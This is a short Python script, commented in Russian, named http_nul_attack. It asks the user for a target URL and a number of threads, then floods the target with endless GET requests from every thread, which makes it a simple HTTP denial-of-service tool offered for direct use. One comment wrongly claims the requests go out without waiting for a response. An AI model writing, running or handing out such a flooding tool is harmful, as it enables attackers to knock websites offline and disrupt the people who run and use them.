import requests
import threading

def http_nul_attack():
    try:
        target_url = input("Введите адрес (например, https://example.com): ")
        num_threads = int(input("Введите количество потоков: "))

        def send_request():
            while True:
                try:
                    # Оптимизированная отправка запроса без ожидания ответа
                    session = requests.Session()
                    session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=num_threads, pool_maxsize=num_threads))
                    session.get(target_url)
                    print("Sent HTTP request without waiting for response")
                except requests.RequestException as e:
                    print(f"Error: {e}")

        # Запуск указанного количества потоков
        threads = [threading.Thread(target=send_request) for _ in range(num_threads)]
        for thread in threads:
            thread.start()

        # Ожидание завершения всех потоков
        for thread in threads:
            thread.join()

    except ValueError:
        print("Некорректное количество потоков.")

# Пример использования
http_nul_attack()
